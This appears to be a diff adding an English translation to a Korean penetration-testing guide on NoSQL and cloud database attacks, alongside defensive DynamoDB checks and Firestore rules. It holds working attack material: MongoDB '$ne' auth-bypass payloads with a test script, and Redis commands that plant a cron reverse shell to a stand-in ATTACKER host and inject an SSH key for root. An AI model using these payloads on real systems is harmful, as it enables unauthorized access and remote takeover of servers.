@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # NoSQL 및 클라우드 DB 공격
 
 NoSQL 데이터베이스와 클라우드 관리형 DB는 기존 SQL 인젝션과 다른 공격 벡터를 가진다. MongoDB 연산자 인젝션, Redis 무인증 접근, DynamoDB IAM 설정 오류 등 클라우드 네이티브 환경에서 반복되는 취약점 패턴을 분석한다.
@@ -476,3 +482,198 @@ def check_dynamodb_encryption(region: str = "ap-northeast-2") -> None:
 | DynamoDB | 공개 테이블 | IAM 정책 검토 (`dynamodb:Scan` 공개 여부) |
 | Firestore | 공개 규칙 | Firebase 콘솔 보안 규칙 검토 |
 | Cosmos DB | 연결 문자열 노출 | 환경 변수, 소스코드, 로그 검색 |
+
+---
+
+<a name="english"></a>
+
+# NoSQL and Cloud DB Attacks
+
+NoSQL databases and cloud-managed DBs have different attack vectors than traditional SQL injection. This section analyzes recurring vulnerability patterns in cloud-native environments including MongoDB operator injection, Redis unauthenticated access, and DynamoDB IAM misconfiguration.
+
+---
+
+## 1. MongoDB NoSQL Injection
+
+```javascript
+// Normal login query
+db.users.findOne({username: "admin", password: "secret"})
+
+// NoSQL injection with $ne (not equal) operator
+// Input: {"username": "admin", "password": {"$ne": ""}}
+db.users.findOne({username: "admin", password: {$ne: ""}})
+// Returns first user whose password is not empty — auth bypass!
+
+// Other operators
+{"$gt": ""}          // Greater than empty string
+{"$regex": ".*"}     // Match any string
+{"$where": "1==1"}   // JavaScript expression
+```
+
+```python
+import requests
+
+def test_nosql_injection(login_url: str) -> bool:
+    """Test for NoSQL injection in login endpoint"""
+    
+    payloads = [
+        # JSON injection
+        {"username": "admin", "password": {"$ne": "invalid"}},
+        {"username": "admin", "password": {"$gt": ""}},
+        {"username": {"$ne": ""}, "password": {"$ne": ""}},
+        
+        # String injection (if JSON not directly used)
+        # username=admin&password[$ne]=invalid
+    ]
+    
+    for payload in payloads:
+        resp = requests.post(login_url, json=payload, timeout=5)
+        if resp.status_code == 200 and "welcome" in resp.text.lower():
+            print(f"[!] NoSQL Injection Success: {payload}")
+            return True
+    
+    return False
+```
+
+---
+
+## 2. Redis Attacks
+
+```bash
+# Redis connection check (no auth)
+redis-cli -h TARGET ping
+# Response: PONG → connected, no authentication
+
+# List all keys
+redis-cli -h TARGET KEYS "*"
+
+# Get all values
+redis-cli -h TARGET KEYS "*" | xargs redis-cli -h TARGET MGET
+
+# Check dangerous commands
+redis-cli -h TARGET CONFIG GET *
+redis-cli -h TARGET CONFIG GET requirepass
+
+# RCE via cron job (if CONFIG SET is available)
+redis-cli -h TARGET CONFIG SET dir /var/spool/cron
+redis-cli -h TARGET CONFIG SET dbfilename root
+redis-cli -h TARGET SET cronjob "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
+redis-cli -h TARGET BGSAVE
+
+# RCE via SSH key injection
+redis-cli -h TARGET CONFIG SET dir /root/.ssh
+redis-cli -h TARGET CONFIG SET dbfilename authorized_keys
+redis-cli -h TARGET SET attacker_key "\n\nssh-rsa AAAA... attacker@kali\n\n"
+redis-cli -h TARGET BGSAVE
+```
+
+---
+
+## 3. AWS DynamoDB Security
+
+```python
+import boto3
+from botocore.exceptions import ClientError
+
+def check_dynamodb_security(region: str = 'us-east-1') -> dict:
+    """Check DynamoDB security configuration"""
+    
+    client = boto3.client('dynamodb', region_name=region)
+    findings = []
+    
+    try:
+        # List all tables
+        tables = client.list_tables()['TableNames']
+        
+        for table_name in tables:
+            # Check encryption
+            desc = client.describe_table(TableName=table_name)['Table']
+            
+            # Check if server-side encryption is enabled
+            sse = desc.get('SSEDescription', {})
+            if sse.get('Status') != 'ENABLED':
+                findings.append({
+                    "table": table_name,
+                    "issue": "Server-side encryption not enabled",
+                    "severity": "Medium"
+                })
+            
+            # Check for public access via resource policy
+            try:
+                policy = client.get_resource_policy(ResourceArn=desc['TableArn'])
+                # Analyze policy for public access
+                import json
+                policy_doc = json.loads(policy['Policy'])
+                for statement in policy_doc.get('Statement', []):
+                    if statement.get('Principal') == '*':
+                        findings.append({
+                            "table": table_name,
+                            "issue": "Table has public resource policy",
+                            "severity": "Critical"
+                        })
+            except ClientError:
+                pass  # No resource policy
+    
+    except ClientError as e:
+        return {"error": str(e)}
+    
+    return {"tables_scanned": len(tables), "findings": findings}
+```
+
+---
+
+## 4. Firebase/Firestore Security
+
+```javascript
+// Vulnerable Firestore security rules
+rules_version = '2';
+service cloud.firestore {
+  match /databases/{database}/documents {
+    match /{document=**} {
+      allow read, write: if true;  // DANGEROUS: Anyone can read/write!
+    }
+  }
+}
+
+// Secure rules
+rules_version = '2';
+service cloud.firestore {
+  match /databases/{database}/documents {
+    // Users can only read/write their own documents
+    match /users/{userId} {
+      allow read, write: if request.auth != null && request.auth.uid == userId;
+    }
+    
+    // Public data is read-only
+    match /public/{document=**} {
+      allow read: if true;
+      allow write: if false;
+    }
+  }
+}
+```
+
+```bash
+# Test Firebase misconfiguration
+curl "https://YOUR-PROJECT.firebaseio.com/.json"
+# If data returns → publicly accessible without authentication!
+
+# Test Firestore
+curl "https://firestore.googleapis.com/v1/projects/YOUR-PROJECT/databases/(default)/documents/users" \
+  -H "Content-Type: application/json"
+```
+
+---
+
+## 5. NoSQL/Cloud DB Security Checklist
+
+| Database | Vulnerability | Test Method |
+|----------|--------------|-------------|
+| MongoDB | Unauthenticated access | `mongo TARGET --eval "db.adminCommand({listDatabases:1})"` |
+| MongoDB | Operator injection | Test with `{"$ne": ""}` payload |
+| Redis | External exposure | `redis-cli -h TARGET ping` |
+| Redis | Dangerous commands enabled | Check if `CONFIG GET *` is executable |
+| Cassandra | Default credentials | Try cassandra/cassandra login |
+| DynamoDB | Public tables | Review IAM policy (`dynamodb:Scan` public?) |
+| Firestore | Public rules | Review Firebase Console security rules |
+| Cosmos DB | Connection string exposed | Search env vars, source code, logs |
